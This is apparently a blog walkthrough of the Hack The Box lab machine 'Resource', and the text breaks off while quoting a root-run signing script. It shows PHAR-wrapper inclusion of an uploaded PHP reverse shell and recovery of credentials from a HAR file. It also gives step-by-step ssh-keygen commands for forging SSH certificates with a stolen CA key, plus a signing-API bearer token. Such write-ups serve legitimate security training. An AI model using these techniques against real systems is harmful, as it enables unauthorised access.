<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Resource</title>
<meta name=description content="Platform: Hack The Box Link: Resource Level: Hard OS: Linux Resource revolves around exploiting SSH and Certificate Authority files. The initial access is …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-resource/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Resource"><meta property="og:description" content="Platform: Hack The Box Link: Resource Level: Hard OS: Linux Resource revolves around exploiting SSH and Certificate Authority files. The initial access is …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Resource/Resource.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Resource/Resource.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Resource"><meta name=twitter:description content="Platform: Hack The Box Link: Resource Level: Hard OS: Linux Resource revolves around exploiting SSH and Certificate Authority files. The initial access is …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-resource/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-resource/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Resource/Resource.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-resource/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-resource/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Resource</h1><small role=doc-subtitle></small><p class=post-date>11 min read |
<span class=post-date>November 22, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Resource>Resource</a></li><li>Level: Hard</li><li>OS: Linux</li></ul><hr><p>Resource revolves around exploiting SSH and Certificate Authority files. The initial access is gained through a PHAR deserialization attack targeting a file upload feature. Next, we recover user credentials from a HAR file, which facilitates lateral movement to another user account. During this process, we discover certificate authority keys, enabling us to generate SSH keys and log in as yet another user. After gaining access to a different host, we escalate our privileges by exploiting a glob injection vulnerability in a bash script, ultimately gaining root access.</p><p>Target IP address - <code>10.10.11.27</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.27 Resource
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,80,2222
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-11-22 18:47 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.27
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.060s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 78:1e:3b:85:12:64:a1:f6:df:52:41:ad:8f:52:97:c0 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> e1:1a:b5:0e:87:a4:a1:81:69:94:9d:d4:d4:a3:8a:f9 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://itrc.ssg.htb/
</span></span><span style=display:flex><span>2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 9.97 seconds
</span></span></code></pre></div><p>The target is running two different versions of SSH: 9.2p1 on port 22 and 8.9p1 on port 2222. It also has HTTP running on port 80 with a redirection to <code>http://itrc.ssg.htb/</code> which we add it to the <code>etc/hosts</code> file.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.27 itrc.ssg.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>We find a website for a resource center at <code>http://itrc.ssg.htb/</code> with a register/login feature.</p><p><img src=/images/HTB-Resource/resource-website.png alt="Resource website"></p><p>After logging in with our newly created account we are able to submit a new ticket at <code>http://itrc.ssg.htb/?page=dashboard</code>.</p><p><img src=/images/HTB-Resource/dashboard-page.png alt="Ticekts list"></p><p>Clicking on <code>New Ticket</code> takes us to <code>http://itrc.ssg.htb/?page=create_ticket</code>.</p><p><img src=/images/HTB-Resource/create_ticket.png alt="New ticket creation"></p><p>Two things are noteworthy here:</p><ul><li>the <code>?page</code> parameter might be vulnerable to LFI</li><li>we might be able to bypass the restrictions of the upload feature and upload a reverse shell</li></ul><p>Let&rsquo;s create a ticket and upload a random zip file to observe how the application works.</p><p><img src=/images/HTB-Resource/test_zip.png alt="file upload test"></p><p>We can click anywhere on a specific ticket to open it and get more information.</p><p><img src=/images/HTB-Resource/uploads_folder.png alt="upload folder"></p><p>While hovering over our file we learn that it is stored in the <code>/uploads</code> directory. With Wappalyzer we see that we are dealing with a PHP application, let&rsquo;s try uploading a PHP reverse shell.</p><p><img src=/images/HTB-Resource/wappalyzer.png alt=wappalyzer></p><p>On <a href=https://www.revshells.com/>revshells</a> we can use the <code>PHP Ivan Sincek</code> shell to create a zip file and upload it on the target.</p><p><img src=/images/HTB-Resource/php_revshell_zip.png alt="reverse shell zip"></p><p><img src=/images/HTB-Resource/revshell_php.png alt="reverse shell upload"></p><p>Both <code>http://itrc.ssg.htb/?page=/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php</code> and <code>http://itrc.ssg.htb/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php</code> fail to trigger the reverse shell so we need to find another way of executing our file.</p><p><img src=/images/HTB-Resource/revshell_fail.png alt="reverse shell trigger failure"></p><h2 id=initial-foothold>Initial Foothold</h2><p>After some research we discover the PHAR (PHP Archive) deserialization attack explained <a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization>here</a> and <a href=https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability>here</a>.</p><blockquote><p>When we create a <code>.zip</code> archive containing the <code>revshell.php</code> file and access it using the <code>phar://</code> stream wrapper, PHP treats the <code>.zip</code> file as a PHAR-compatible archive. The <code>phar://</code> protocol allows PHP to directly access files within the archive, including executable PHP scripts. When the URL <code>http://itrc.ssg.htb/?page=phar://uploads/.../revshell</code> is processed, the server executes the <code>revshell.php</code> file within the archive as PHP code, triggering the reverse shell. This works because the server uses an insecure file inclusion mechanism (<code>include</code>, <code>require</code>, or similar) without properly validating or restricting the file path, allowing code execution through the <code>phar://</code> wrapper.</p></blockquote><p>Using <code>http://itrc.ssg.htb/?page=phar://uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell</code> we successfully trigger the reverse shell. We obtain a connection on our listener as <code>www-data</code> and we are in <code>/var/www/itrc</code>.</p><p><img src=/images/HTB-Resource/phar_revshell.png alt="phar reverse shell"></p><p><img src=/images/HTB-Resource/foothold.png alt=foothold></p><p>In the <code>uploads</code> directory we find many ZIP archives, we personally uploaded only two of them so let&rsquo;s see what the other ones contain.</p><p><img src=/images/HTB-Resource/uploads_folder_ontarget.png alt="application upload directory"></p><p><img src=/images/HTB-Resource/upload_directory_content.png alt="upload directory content"></p><p>We run the command below to extract all the archives in the folder.</p><pre tabindex=0><code>for file in *.zip; do unzip &#34;$file&#34;; done
</code></pre><p><img src=/images/HTB-Resource/bulk_extraction.png alt="bulk extraction"></p><p>After the extraction we recover some public keys (for the Ed25519 and RSA algorithms), a <code>.har</code> file and the files we previuosly uploaded.</p><blockquote><p><code>.har</code> files are JSON-formatted text files containing detailed information about HTTP requests and responses during a browsing session.</p></blockquote><p><img src=/images/HTB-Resource/files_after_extraction.png alt="files after extraction"></p><h3 id=shell-as-msainristil-on-itrc-host>Shell as msainristil (on itrc host)</h3><p>With <code>cat /etc/passwd</code> we notice two users on the system <code>msainristil</code> and <code>zzinter</code>. Using <code>cat itrc.ssg.htb.har | grep msainristil</code> we recover some credentials which are <code>msainristil:82yards2closeit</code>.</p><p><img src=/images/HTB-Resource/user_list.png alt="user list"></p><p><img src=/images/HTB-Resource/msainristil_creds.png alt="msainristil credentials"></p><p>We login via SSH with the credentials obtained but still no user flag, instead we have some files related to a certificate of authority.</p><p><code>ca-itrc</code> and <code>ca-itrc.pub</code> are very likely the private and public keys of a Certificate Authority used for signing certificates, which can include SSH keys or other types of certificates.</p><p><img src=/images/HTB-Resource/msainristil_files.png alt="CA files"></p><h3 id=shell-as-zzinter-on-itrc-host>Shell as zzinter (on itrc host)</h3><p>Since we have access to the CA private key, we can create a SSH key to login as <code>zzinter</code>.</p><ol><li>Create an SSH Key Pair for zzinter.</li></ol><pre tabindex=0><code>ssh-keygen -t rsa -b 4096 -f id_rsa_zzinter
</code></pre><table><thead><tr><th>Command/Options</th><th>Description</th></tr></thead><tbody><tr><td>ssh-keygen</td><td>Command-line tool used to generate SSH keys.</td></tr><tr><td>-t rsa</td><td>Specifies the type of key to create (RSA key pair in our case).</td></tr><tr><td>-b 4096</td><td>Bit length, our RSA key will have a length of 4096 bits.</td></tr><tr><td>-f id_rsa_zzinter</td><td>Specifies the filename.</td></tr></tbody></table><p><img src=/images/HTB-Resource/zzinter_keys.png alt="zzinter keys"></p><ol start=2><li>Create the SSH Certificate for zzinter.</li></ol><pre tabindex=0><code>ssh-keygen -s ca-itrc -I zzinter_key_id -n zzinter -V +52w id_rsa_zzinter.pub
</code></pre><table><thead><tr><th>Command/Options</th><th>Description</th></tr></thead><tbody><tr><td>-s ca-itrc</td><td>Path to the CA&rsquo;s private key.</td></tr><tr><td>-I zzinter_key_id</td><td>Unique identifier for the certificate (you can pick any name).</td></tr><tr><td>-n zzinter</td><td>The principal (user) for which the certificate is valid.</td></tr><tr><td>-V +52w</td><td>Sets validity period (52 weeks here).</td></tr><tr><td>id_rsa_zzinter.pub</td><td>The public key we are signing.</td></tr></tbody></table><p><img src=/images/HTB-Resource/zzinter_SSH_certificate.png alt="zzinter SSH certificate"></p><ol start=3><li>Login using the SSH key.</li></ol><pre tabindex=0><code>ssh -i id_rsa_zzinter zzinter@itrc.ssg.htb
</code></pre><p><img src=/images/HTB-Resource/zzinter_login.png alt="zzinter SSH login"></p><p>Below is the content of <code>sign_key_api.sh</code>. It automates the process of submitting a public SSH key to the signing service <code>signserv.ssg.htb</code> to generate a signed SSH certificate for a given user.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span>usage <span style=color:#56b6c2>()</span> <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Usage: </span><span style=color:#e06c75>$0</span><span style=color:#98c379> &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>exit</span> <span style=color:#d19a66>1</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$#</span><span style=color:#98c379>&#34;</span> -ne <span style=color:#d19a66>3</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>public_key_file</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$1</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>username</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$2</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>principal_str</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$3</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>supported_principals</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;webserver,analytics,support,security&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>IFS</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;,&#39;</span> <span style=color:#e5c07b>read</span> -ra principal <span style=color:#56b6c2>&lt;&lt;&lt;</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$principal_str</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> word in <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>principal</span>[@]<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> ! <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$supported_principals</span><span style=color:#98c379>&#34;</span> | grep -qw <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$word</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: &#39;</span><span style=color:#e06c75>$word</span><span style=color:#98c379>&#39; is not a supported principal.&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Choose from:&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    webserver - external web servers - webadmin user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    analytics - analytics team databases - analytics user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    support - IT support server - support user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    security - SOC servers - support user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span>
</span></span><span style=display:flex><span>        usage
</span></span><span style=display:flex><span>    <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> ! -f <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: Public key file &#39;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#39; not found.&#34;</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>public_key</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>cat <span style=color:#e06c75>$public_key_file</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>curl -s signserv.ssg.htb/v1/sign -d <span style=color:#98c379>&#39;{&#34;pubkey&#34;: &#34;&#39;</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$public_key</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>&#39;&#34;, &#34;username&#34;: &#34;&#39;</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$username</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>&#39;&#34;, &#34;principals&#34;: &#34;&#39;</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$principal</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>&#39;&#34;}&#39;</span> -H <span style=color:#98c379>&#34;Content-Type: application/json&#34;</span> -H <span style=color:#98c379>&#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;</span>
</span></span></code></pre></div><p>Let&rsquo;s use the same process from earlier to create a SSH key for root, and see if we find anything of interest there.</p><pre tabindex=0><code>ssh-keygen -t rsa -b 4096 -f id_rsa_root
ssh-keygen -s ca-itrc -I root_key_id -n root -V +52w id_rsa_root.pub
ssh -i id_rsa_root root@itrc.ssg.htb
</code></pre><p>Unfortunately the root folder is empty, but we notice a different IP address mentioned (<code>172.223.0.3</code>). This probably means that we are inside a container that we need to break out of.</p><p><img src=/images/HTB-Resource/root_ssh.png alt="root SSH login"></p><h3 id=shell-as-support-on-ssg-host>Shell as support (on ssg host)</h3><p>The script contains a list of supported principals, so let&rsquo;s use one of them.</p><ol><li>Generate an SSH key for <code>support</code>.</li></ol><pre tabindex=0><code>ssh-keygen -t rsa -b 4096 -f id_rsa_support
</code></pre><ol start=2><li>We use the script to generate a signed SSH certificate for the supported principal support.</li></ol><pre tabindex=0><code>bash ./sign_key_api.sh id_rsa_support.pub support support
</code></pre><ul><li>You will receive the SSH certificate in OpenSSH format. You need to put it in a file but we do not have access to a text editor. So use <code>echo "YOUR_SSH_CERTIFICATE" > id_rsa_support-cert.pub</code>.</li></ul><p><img src=/images/HTB-Resource/support_ssh_cert.png alt="support SSH certificate"></p><ol start=3><li>Change the file permissions</li></ol><pre tabindex=0><code>chmod 600 id_rsa_support
chmod 600 id_rsa_support-cert.pub
</code></pre><ol start=4><li>Login via SSH</li></ol><pre tabindex=0><code>ssh -i id_rsa_support -p 2222 support@172.223.0.1
</code></pre><p><img src=/images/HTB-Resource/support_ssh_login.png alt="root SSH login"></p><p>The hostname of our previous SSH session (with root) was <code>itrc</code>, now we are logged in as <code>support</code> and the hostname is <code>ssg</code>. The home folder of <code>support</code> is empty, and checking the <code>etc/passwd</code> file on this host shows that <code>zzinter</code> is also a user here.</p><p><img src=/images/HTB-Resource/zzinter_ssg_host.png alt="zzinter user on ssg host"></p><h3 id=shell-as-zzinter-on-ssg-host>Shell as zzinter (on ssg host)</h3><p>We will repeat the same process and login as <code>zzinter</code> on the new host. The issue here is that we cannot generate a signed certificate by using the script because <code>zzinter</code> is not a supported principal.</p><p>Examining the script again we see that it uses <code>curl</code> to fetch the SSH certificate, it expects three things: a public_key, a username, and some principal(s). Currently we lack a valid principal name.</p><pre tabindex=0><code>curl -s signserv.ssg.htb/v1/sign -d &#39;{&#34;pubkey&#34;: &#34;&#39;&#34;$public_key&#34;&#39;&#34;, &#34;username&#34;: &#34;&#39;&#34;$username&#34;&#39;&#34;, &#34;principals&#34;: &#34;&#39;&#34;$principal&#34;&#39;&#34;}&#39; -H &#34;Content-Type: application/json&#34; -H &#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;
</code></pre><p>The content of <code>/etc/ssh/sshd_config.d/sshcerts.conf</code> shows us that a principal file located at <code>/etc/ssh/auth_principals</code> is used by SSH on this host. Checking the file we find <code>zzinter_temp</code> to be a valid principal namae for <code>zzinter</code>.</p><p><img src=/images/HTB-Resource/principal_file.png alt="SSH principal file"></p><p><img src=/images/HTB-Resource/zzinter_temp.png alt="zzinter valid principal name"></p><p>With all the required elements we can now repeat the process used earlier.</p><ol><li>Generate an SSH key for zzinter.</li></ol><pre tabindex=0><code>ssh-keygen -t rsa -b 4096 -f id_rsa_zzinter
</code></pre><ol start=2><li>To obtain our signed certificate we send a request with curl.</li></ol><pre tabindex=0><code>curl signserv.ssg.htb/v1/sign -d &#39;{&#34;pubkey&#34;: &#34;YOUR_GENERATED_PUBLIC_KEY&#34;, &#34;username&#34;: &#34;zzinter&#34;, &#34;principals&#34;: &#34;zzinter_temp&#34;}&#39; -H &#34;Content-Type: application/json&#34; -H &#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;
</code></pre><ul><li>Store the certificate in a file.</li></ul><pre tabindex=0><code>echo &#34;YOUR_SSH_CERTIFICATE&#34; &gt; id_rsa_zzinter-cert.pub
</code></pre><ol start=3><li>Modify the file permissions.</li></ol><pre tabindex=0><code>chmod 600 id_rsa_zzinter
chmod 600 id_rsa_zzinter-cert.pub
</code></pre><ol start=4><li>Login as <code>zzinter</code> on the new host.</li></ol><pre tabindex=0><code>ssh -i id_rsa_zzinter -p 2222 zzinter@172.223.0.1
</code></pre><p><img src=/images/HTB-Resource/zzinter_ssh_ssg_host.png alt="zzinter ssh login on ssg host"></p><h2 id=privilege-escalation---root-shell-on-ssg-host>Privilege Escalation - root shell (on ssg host)</h2><p>The home folder of <code>zzinter</code> only contains the user flag, but running <code>sudo -l</code> we learn that this user can execute <code>/opt/sign_key.sh</code> as root without providing a password.</p><p><img src=/images/HTB-Resource/sudo-l-cmd.png alt="sudo -l command"></p><p>The output of <code>sign_key.sh</code> is as below. The script is similar to the <code>sign_key_api.sh</code> script, it uses <code>ssh-keygen</code> to sign an SSH public key using a specified CA private key to create a signed SSH certificate. It expects five arguments and also performs a matching operation with the <code>/etc/ssh/ca-it</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span>usage <span style=color:#56b6c2>()</span> <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Usage: </span><span style=color:#e06c75>$0</span><span style=color:#98c379> &lt;ca_file&gt; &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt; &lt;serial&gt;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>exit</span> <span style=color:#d19a66>1</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$#</span><span style=color:#98c379>&#34;</span> -ne <span style=color:#d19a66>5</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>ca_file</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$1</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>public_key_file</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$2</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>username</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$3</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>principal_str</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$4</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>serial</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$5</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> ! -f <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$ca_file</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: CA file &#39;</span><span style=color:#e06c75>$ca_file</span><span style=color:#98c379>&#39; not found.&#34;</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>itca</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>cat /etc/ssh/ca-it<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>ca</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>cat <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$ca_file</span><span style=color:#98c379>&#34;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[[</span> <span style=color:#e06c75>$itca</span> <span style=color:#56b6c2>==</span> <span style=color:#e06c75>$ca</span> <span style=color:#56b6c2>]]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: Use API for signing with this CA.&#34;</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> ! -f <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: Public key file &#39;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#39; not found.&#34;</span>
</span></span><span style=display:flex><span>    usage
